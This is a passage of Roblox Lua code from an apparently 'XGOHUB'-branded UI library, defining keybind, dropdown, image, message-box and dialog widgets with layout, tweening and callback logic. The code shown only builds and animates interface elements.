			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true

			Content.Name = "Content"
			Content.Parent = KeybindBlock
			Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Content.BackgroundTransparency = 1.000
			Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Content.BorderSizePixel = 0
			Content.Position = UDim2.new(0, 5, 0, 18)
			Content.Size = UDim2.new(1, 0, 0, 45)
			Content.Visible = false
			Content.ZIndex = 11
			Content.Font = Enum.Font.Gotham
			Content.Text = setup.Content
			Content.TextColor3 = Library.Colors.TextColor
			Content.TextSize = 13.000
			Content.TextStrokeColor3 = Library.Colors.TextColor
			Content.TextStrokeTransparency = 0.950
			Content.TextTransparency = 0.500
			Content.TextWrapped = true
			Content.TextXAlignment = Enum.TextXAlignment.Left
			Content.TextYAlignment = Enum.TextYAlignment.Top
			Content.RichText = true

			Block.Name = "Block"
			Block.Parent = KeybindBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 50, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.300000012, 0)
			UICorner.Parent = Block

			ValueText.Name = "ValueText"
			ValueText.Parent = Block
			ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ValueText.BackgroundTransparency = 1.000
			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueText.BorderSizePixel = 0
			ValueText.Position = UDim2.new(0.5, 0, 0.5, 0)
			ValueText.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
			ValueText.ZIndex = 17
			ValueText.Font = Enum.Font.Gotham
			ValueText.Text = Parser(setup.Default)
			ValueText.TextColor3 = Library.Colors.TextColor
			ValueText.TextScaled = true
			ValueText.TextSize = 14.000
			ValueText.TextStrokeColor3 = Library.Colors.TextColor
			ValueText.TextStrokeTransparency = 0.950
			ValueText.TextWrapped = true

			Button.Name = "Button"
			Button.Parent = KeybindBlock
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 15
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Library:MakeDrop(KeybindBlock, UIStroke, Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(KeybindBlock, tostring(setup.Tip))
			end

			local UpdateSize = function()
				local Size = Library:GetTextSize(ValueText.Text, ValueText.TextSize, ValueText.Font)

				Library:Tween(Block, Library.TweenLibrary.SmallEffect, {
					Size = UDim2.new(0, Size.X + 10, 0.5, 0),
				})
			end

			UpdateSize()

			local Await = false

			Button.MouseButton1Click:Connect(function()
				if Await then
					return
				end

				Await = true
				local KeyCode = nil

				ValueText.Text = "..."

				UpdateSize()

				while true do
					local Input = Library.UserInputService.InputBegan:Wait()

					if Input.KeyCode and Input.KeyCode ~= Enum.KeyCode.Unknown then
						KeyCode = Input.KeyCode
						break
					end
				end

				ValueText.Text = KeyCode.Name

				UpdateSize()

				setup.Callback(KeyCode)
				Await = false
			end)

			local UpdateBlock = function()
				local TitleSize = TextLabel.TextSize
				local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
				local ContentSize = setup.Content:len() > 0
						and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font)
					or Vector2.new(0, 0)

				local TotalHeight = MainSize.Y + 10
				if setup.Content:len() > 0 then
					Content.Visible = true
					TotalHeight = TotalHeight + ContentSize.Y + 5
					TextLabel.Position = UDim2.new(0, 5, 0, 12)
					TextLabel.Size = UDim2.new(1, 0, 0, 14)
				else
					Content.Visible = false
					TotalHeight = TotalHeight + 15.20000000000001
					TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
					TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
				end

				KeybindBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
			end
			UpdateBlock()

			local RootSkid = {}

			function RootSkid:Content(Setup)
				Content.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Value(Setup)
				setup.Default = Setup

				ValueText.Text = Parser(Setup)

				UpdateSize()

				setup.Callback(Setup)
				UpdateBlock()
			end

			function RootSkid:Visible(value)
				KeybindBlock.Visible = value
			end

			return RootSkid
		end
		------ // 下拉菜单组件完整版   [脚本认准XGOHUB] ----------------------------------------------------------------------------------------
		function Root:Dropdown(setup)
			setup = setup or {}
			setup.Title = setup.Title or "下拉菜单"
			setup.Content = setup.Content or ""
			setup.Values = setup.Values or {}
			setup.OptionVisible = setup.OptionVisible
				or setmetatable({}, {
					__index = function(t, k)
						return true
					end,
				})
			setup.Multi = setup.Multi or false
			setup.Default = setup.Default
			setup.MaxMulti = setup.MaxMulti or math.huge
			setup.Callback = setup.Callback or function() end

			local Fconcat = function(a)
				if typeof(a) ~= "table" then
					return tostring(a)
				end

				local p, l = pcall(table.concat, a, " , ")
				if p then
					return l
				end

				local std = {}
				table.foreach(a, function(a, v)
					if typeof(v) == "boolean" then
						table.insert(std, tostring(a))
					else
						table.insert(std, tostring(v))
					end
				end)
				return table.concat(std, " , ")
			end

			local DropdownBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local Button = Instance.new("TextButton")
			local ValueText = Instance.new("TextLabel")

			DropdownBlock.Name = "DropdownBlock"
			DropdownBlock.Parent = ScrollingFrame
			DropdownBlock.BackgroundColor3 = Library.Colors.Default
			DropdownBlock.BackgroundTransparency = 0.250
			DropdownBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			DropdownBlock.BorderSizePixel = 0
			DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			DropdownBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = DropdownBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = DropdownBlock

			TextLabel.Parent = DropdownBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true

			Content.Name = "Content"
			Content.Parent = DropdownBlock
			Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Content.BackgroundTransparency = 1.000
			Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Content.BorderSizePixel = 0
			Content.Position = UDim2.new(0, 5, 0, 18)
			Content.Size = UDim2.new(1, 0, 0, 45)
			Content.Visible = false
			Content.ZIndex = 11
			Content.Font = Enum.Font.Gotham
			Content.Text = setup.Content
			Content.TextColor3 = Library.Colors.TextColor
			Content.TextSize = 13.000
			Content.TextStrokeColor3 = Library.Colors.TextColor
			Content.TextStrokeTransparency = 0.950
			Content.TextTransparency = 0.500
			Content.TextWrapped = true
			Content.TextXAlignment = Enum.TextXAlignment.Left
			Content.TextYAlignment = Enum.TextYAlignment.Top
			Content.RichText = true

			Block.Name = "Block"
			Block.Parent = DropdownBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 75, 0.600000024, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.200000003, 0)
			UICorner.Parent = Block

			Button.Name = "Button"
			Button.Parent = Block
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 20
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			ValueText.Name = "ValueText"
			ValueText.Parent = Block
			ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ValueText.BackgroundTransparency = 1.000
			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueText.BorderSizePixel = 0
			ValueText.Position = UDim2.new(0.5, 0, 0.5, 0)
			ValueText.Size = UDim2.new(0.800000012, 0, 0.600000024, 0)
			ValueText.ZIndex = 17
			ValueText.Font = Enum.Font.Gotham
			ValueText.Text = (setup.Multi and Fconcat(setup.Default or {})) or tostring(setup.Default or "NONE")
			ValueText.TextColor3 = Library.Colors.TextColor
			ValueText.TextScaled = true
			ValueText.TextSize = 14.000
			ValueText.TextStrokeColor3 = Library.Colors.TextColor
			ValueText.TextStrokeTransparency = 0.950
			ValueText.TextWrapped = true

			Library:MakeDrop(DropdownBlock, UIStroke, Library.Colors.Hightlight)
			Library:MakeDrop(Block, UIStroke_2, Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(DropdownBlock, tostring(setup.Tip))
			end

			local UpdateSize = function()
				local size = Library:GetTextSize(ValueText.Text, ValueText.TextSize, ValueText.Font)
				pcall(function()
					Library:Tween(Block, Library.TweenLibrary.SmallEffect, {
						Size = UDim2.new(
							0,
							math.clamp(size.X + 15, 75, DropdownBlock.AbsoluteSize.X / 1.5),
							0.600000024,
							0
						),
					})
				end)
			end

			local OnCallback = function(a)
				ValueText.Text = (setup.Multi and Fconcat(a)) or tostring(a)
				setup.Default = a
				UpdateSize()
				setup.Callback(a)
			end

			UpdateSize()

			local getVisibleValues = function()
				local visibleVals = {}
				for _, val in ipairs(setup.Values) do
					if setup.OptionVisible[val] then
						table.insert(visibleVals, val)
					end
				end
				return visibleVals
			end

			Button.MouseButton1Click:Connect(function()
				UpdateSize()
				WindowLibrary:ClearDropdown()

				local visibleValues = getVisibleValues()
				if setup.Multi then
					WindowLibrary:SetDropdownValues(0, visibleValues, {
						Info = setup.Default,
						Max = setup.MaxMulti,
					}, OnCallback)
				else
					WindowLibrary:SetDropdownValues(1, visibleValues, setup.Default, OnCallback)
				end

				WindowLibrary:OpenDropdown(Block)
			end)

			local UpdateBlock = function()
				local TitleSize = TextLabel.TextSize
				local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
				local ContentSize = setup.Content:len() > 0
						and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font)
					or Vector2.new(0, 0)

				local TotalHeight = MainSize.Y + 10
				if setup.Content:len() > 0 then
					Content.Visible = true
					TotalHeight = TotalHeight + ContentSize.Y + 5
					TextLabel.Position = UDim2.new(0, 5, 0, 12)
					TextLabel.Size = UDim2.new(1, 0, 0, 14)
				else
					Content.Visible = false
					TotalHeight = TotalHeight + 15.20000000000001
					TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
					TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
				end

				DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
			end
			UpdateBlock()

			local RootSkid = {}

			function RootSkid:GetValue()
				return setup.Default
			end

			function RootSkid:Content(Setup)
				Content.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Value(SetupR)
				setup.Default = SetupR
				ValueText.Text = (setup.Multi and Fconcat(SetupR)) or tostring(SetupR)
				UpdateSize()
				setup.Callback(SetupR)
				UpdateBlock()
			end

			function RootSkid:SetValue(data)
				setup.Values = data
				for _, val in ipairs(data) do
					if setup.OptionVisible[val] == nil then
						setup.OptionVisible[val] = true
					end
				end
			end

			function RootSkid:Visible(value)
				DropdownBlock.Visible = value
			end

			function RootSkid:SetOptionVisible(option, isVisible)
				local isOptionValid = false
				for _, val in ipairs(setup.Values) do
					if val == option then
						isOptionValid = true
						break
					end
				end
				if not isOptionValid then
					warn("Dropdown Error: 选项不存在 -> " .. tostring(option))
					return
				end

				setup.OptionVisible[option] = isVisible
			end

			return RootSkid
		end

		------ // 图像组件   ----------------------------------------------------------------------------------------
		function Root:Image(setup)
			setup = setup or {}
			setup.Title = setup.Title or "图像"
			setup.Asset = setup.Asset or "rbxassetid://123698784885744"
			setup.Height = setup.Height or 120

			local ImageBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local Title = Instance.new("TextLabel")
			local ImageLabel = Instance.new("ImageLabel")

			ImageBlock.Name = "ImageBlock"
			ImageBlock.Parent = ScrollingFrame
			ImageBlock.BackgroundColor3 = Library.Colors.Default
			ImageBlock.BackgroundTransparency = 0.250
			ImageBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ImageBlock.BorderSizePixel = 0
			ImageBlock.Size = UDim2.new(0.99000001, 0, 0, 150)
			ImageBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = ImageBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = ImageBlock

			Title.Name = "Title"
			Title.Parent = ImageBlock
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0, 5, 0, 5)
			Title.Size = UDim2.new(1, 0, 0, 14)
			Title.ZIndex = 11
			Title.Font = Enum.Font.Gotham
			Title.Text = setup.Title
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextScaled = true
			Title.TextSize = 14.000
			Title.TextStrokeColor3 = Color3.fromRGB(191, 193, 195)
			Title.TextStrokeTransparency = 0.950
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextWrapped = true
			Title.TextXAlignment = Enum.TextXAlignment.Left

			ImageLabel.Parent = ImageBlock
			ImageLabel.AnchorPoint = Vector2.new(0.5, 0)
			ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ImageLabel.BackgroundTransparency = 1.000
			ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ImageLabel.BorderSizePixel = 0
			ImageLabel.Position = UDim2.new(0.5, 0, 0, 23)
			ImageLabel.Size = UDim2.new(0.980000019, 0, 0, setup.Height)
			ImageLabel.ZIndex = 11
			ImageLabel.Image = setup.Asset
			ImageLabel.ScaleType = Enum.ScaleType.Fit

			if setup.Tip then
				WindowLibrary:AddToolTip(ImageBlock, tostring(setup.Tip))
			end

			local update = function()
				if not WindowLibrary.Toggle then
					return
				end

				Library:Tween(ImageBlock, Library.TweenLibrary.SmallEffect, {
					Size = UDim2.new(0.99000001, 0, 0, Title.AbsoluteSize.Y + 17 + ImageLabel.AbsoluteSize.Y),
				})
			end

			update()

			MainFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(update)

			local RootSkid = {}

			function RootSkid:GetValue()
				return ImageLabel.Image
			end

			function RootSkid:Value(Setup, height)
				height = height or setup.Height
				ImageLabel.Image = Setup
				ImageLabel.Size = UDim2.new(0.980000019, 0, 0, height)

				update()
			end

			function RootSkid:Visible(value)
				ImageBlock.Visible = value
			end

			return RootSkid
		end

		return Root
	end
	do
		local Black = Instance.new("Frame")

		Black.Name = "Black"
		Black.Parent = MainFrame
		Black.AnchorPoint = Vector2.new(0.5, 0.5)
		Black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Black.BackgroundTransparency = 1 --0.550
		Black.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Black.BorderSizePixel = 0
		Black.Position = UDim2.new(0.5, 0, 0.5, 0)
		Black.Size = UDim2.new(1, 0, 1, 0)
		Black.ZIndex = -25 --250
		Black.Active = true

		local OpenBackground = function()
			Library:Tween(Black, Library.TweenLibrary.SmallEffect, {
				ZIndex = 250,
				BackgroundTransparency = 0.55,
			})
		end

		local CloseBackground = function()
			Library:Tween(Black, Library.TweenLibrary.SmallEffect, {
				ZIndex = -25,
				BackgroundTransparency = 1,
			})
		end

		function WindowLibrary:Message(setup)
			setup = setup or {}
			setup.Title = setup.Title or "Message"
			setup.Description = setup.Description or "Description"

			local Message = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local UIGradient = Instance.new("UIGradient")
			local Title = Instance.new("TextLabel")
			local Description = Instance.new("TextLabel")

			Message.Name = "Message"
			Message.Parent = Black
			Message.Active = true
			Message.AnchorPoint = Vector2.new(0.5, 0.5)
			Message.BackgroundColor3 = Color3.fromRGB(32, 33, 36)
			Message.BackgroundTransparency = 0.250
			Message.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Message.BorderSizePixel = 0
			Message.Position = UDim2.new(0.5, 0, 0.5, 0)
			Message.Size = UDim2.new(0, 55, 0, 0)
			Message.ZIndex = 265
			Message.ClipsDescendants = true

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = Message
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Rotation = 0.010
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 264
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 1
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = Message

			UIGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
				ColorSequenceKeypoint.new(1.00, Color3.fromRGB(209, 209, 209)),
			})
			UIGradient.Rotation = 90
			UIGradient.Parent = Message

			Title.Name = "Title"
			Title.Parent = Message
			Title.AnchorPoint = Vector2.new(0.5, 0)
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0.5, 0, 0, 10)
			Title.Size = UDim2.new(0.899999976, 0, 0, 15)
			Title.ZIndex = 275
			Title.Font = Enum.Font.Gotham
			Title.Text = setup.Title
			Title.TextColor3 = Color3.fromRGB(220, 224, 234)
			Title.TextScaled = true
			Title.TextSize = 16.000
			Title.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
			Title.TextStrokeTransparency = 0.950

			Description.Name = "Description"
			Description.Parent = Message
			Description.AnchorPoint = Vector2.new(0.5, 0)
			Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Description.BackgroundTransparency = 1.000
			Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Description.BorderSizePixel = 0
			Description.Position = UDim2.new(0.5, 0, 0, 35)
			Description.Size = UDim2.new(0.899999976, 0, 0, 15)
			Description.ZIndex = 275
			Description.Font = Enum.Font.Gotham
			Description.Text = setup.Description
			Description.TextColor3 = Color3.fromRGB(220, 224, 234)
			Description.TextScaled = true
			Description.TextSize = 14.000
			Description.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
			Description.TextStrokeTransparency = 0.950
			Description.TextTransparency = 0.500

			OpenBackground()

			local Update = function()
				Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
					ImageTransparency = 0.25,
				})

				local DescriptionSize = Library:GetTextSize(Description.Text, Description.TextSize, Description.Font)
				local TitleSize = Library:GetTextSize(Title.Text, Title.TextSize, Title.Font)

				Description.Size = UDim2.fromOffset(DescriptionSize.X + 45, DescriptionSize.Y + 6)
				Title.Size = UDim2.fromOffset(TitleSize.X + 5, TitleSize.Y + 6)

				local MainX = ((TitleSize.X > DescriptionSize.X) and TitleSize.X) or DescriptionSize.X

				Library:Tween(Message, Library.TweenLibrary.SmallEffect, {
					Size = UDim2.fromOffset(MainX + 35, DescriptionSize.Y + 75 + TitleSize.Y),
					BackgroundTransparency = 0.250,
				})

				Library:Tween(UIStroke, Library.TweenLibrary.SmallEffect, {
					Transparency = 0.850,
				})
			end

			Update()

			local rfm = {}

			function rfm:Title(s)
				Title.Text = s
				Update()
			end

			function rfm:Description(s)
				Description.Text = s
				Update()
			end

			function rfm:Destroy(s)
				CloseBackground()

				Library:Tween(Message, Library.TweenLibrary.SmallEffect, {
					Size = UDim2.fromOffset(Message.AbsoluteSize.X - 25, 0),
					BackgroundTransparency = 1,
				})

				Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
					ImageTransparency = 1,
				})

				Library:Tween(UIStroke, Library.TweenLibrary.SmallEffect, {
					Transparency = 1,
				})

				task.delay(0.5, function()
					Message:Destroy()
				end)
			end

			return rfm
		end
		-----------------------------------框架-------------------------------------------------------------------------------------------------------------
		function WindowLibrary:Dialog(setup)
			if WindowLibrary.DialogStopTask then
				WindowLibrary.DialogStopTask()
			end

			setup = setup or {}

			setup.Title = setup.Title or "\91\32\45\88\71\79\45\72\85\66\45\32\93"
			setup.Content = setup.Content or "\91\32\45\88\71\79\45\72\85\66\45\32\93"
			setup.Buttons = setup.Buttons
				or {
					{
						Title = "是",
						Hightlight = true,
						Callback = function() end,
					},
					{
						Title = "否",
						Callback = function() end,
					},
				}

			OpenBackground()

			local Already = false
			local AntiTouch = false
			local Dialog = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local UIGradient = Instance.new("UIGradient")
			local Title = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel") -- 新增的内容标签
			local Buttons = Instance.new("Frame")
			local UIListLayout = Instance.new("UIListLayout")

			Dialog.Name = "Dialog"
			Dialog.Parent = Black
			Dialog.AnchorPoint = Vector2.new(0.5, 0.5)
			Dialog.BackgroundColor3 = Library.Colors.Default
			Dialog.BackgroundTransparency = 1
			Dialog.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Dialog.BorderSizePixel = 0
			Dialog.Position = UDim2.new(0.5, 0, 0.5, 0)
			Dialog.Size = UDim2.new(0.1, 250, 0.1, 100)
			Dialog.ZIndex = 265
			Dialog.Active = true

			Library:Tween(Dialog, Library.TweenLibrary.SmallEffect, {
				BackgroundTransparency = 0.250,
				Size = UDim2.new(0, 250, 0, 100),
			})

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = Dialog
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Rotation = 0.010
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 264
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 1
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
				ImageTransparency = 0.500,
			})

			UIStroke.Transparency = 1
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = Dialog

			Library:Tween(UIStroke, Library.TweenLibrary.SmallEffect, {
				Transparency = 0.850,
			})

			UIGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
				ColorSequenceKeypoint.new(1.00, Color3.fromRGB(209, 209, 209)),
			})
			UIGradient.Rotation = 90
			UIGradient.Parent = Dialog

			Title.Name = "Title"
			Title.Parent = Dialog
			Title.AnchorPoint = Vector2.new(0.5, 0)
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0.5, 0, 0.0649999976, 0)
			Title.Size = UDim2.new(0.899999976, 0, 0, 15)
			Title.ZIndex = 275
			Title.Font = Enum.Font.Gotham
			Title.Text = setup.Title
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextScaled = true
			Title.TextSize = 14.000
			Title.TextStrokeColor3 = Library.Colors.TextColor
			Title.TextStrokeTransparency = 1
			Title.TextWrapped = true
			Title.TextTransparency = 1
			Title.RichText = true

			Library:Tween(Title, Library.TweenLibrary.SmallEffect, {
				TextStrokeTransparency = 0.950,
				TextTransparency = 0,
			})

			Content.Name = "Content"
			Content.Parent = Dialog
			Content.AnchorPoint = Vector2.new(0.5, 0)
			Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Content.BackgroundTransparency = 1.000
			Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Content.BorderSizePixel = 0
			Content.Position = UDim2.new(0.5, 0, 0.2000000059604645, 0)
			Content.Size = UDim2.new(0.899999976, 0, 0, 30)
			Content.ZIndex = 275
			Content.Font = Enum.Font.Gotham
			Content.Text = setup.Content
			Content.TextColor3 = Library.Colors.TextColor
			Content.TextScaled = true
			Content.TextSize = 14.000
			Content.TextStrokeColor3 = Library.Colors.TextColor
			Content.TextStrokeTransparency = 1
			Content.TextWrapped = true
			Content.TextTransparency = 1
			Content.RichText = true

			Library:Tween(Content, Library.TweenLibrary.SmallEffect, {
				TextStrokeTransparency = 0.950,
				TextTransparency = 0,
			})

			Buttons.Name = "Buttons"
			Buttons.Parent = Dialog
			Buttons.AnchorPoint = Vector2.new(0.5, 1)
			Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Buttons.BackgroundTransparency = 1.000
			Buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Buttons.BorderSizePixel = 0
			Buttons.Position = UDim2.new(0.5, 0, 1, 0)
			Buttons.Size = UDim2.new(0.899999976, 0, 0, 50)
			Buttons.ZIndex = 275

			UIListLayout.Parent = Buttons
			UIListLayout.FillDirection = Enum.FillDirection.Horizontal
			UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 5)
			UIListLayout.Wraps = true

			Dialog.MouseEnter:Connect(function()
				AntiTouch = true
			end)

			Dialog.MouseLeave:Connect(function()
				AntiTouch = false
			end)

			local ListFunctions = {}
			local Thread = task.spawn(function()
				while true do
					game:GetService("RunService").Heartbeat:Wait()

					if #setup.Buttons <= 6 then
						Library:Tween(Buttons, Library.TweenLibrary.SmallEffect, {
							Size = UDim2.new(0, 260, 0, (UIListLayout.AbsoluteContentSize.Y + 25)),
						})

						Library:Tween(Dialog, Library.TweenLibrary.SmallEffect, {
							Size = UDim2.new(0.05, 265, 0.05, Title.AbsoluteSize.Y + Buttons.AbsoluteSize.Y + 45),
						})
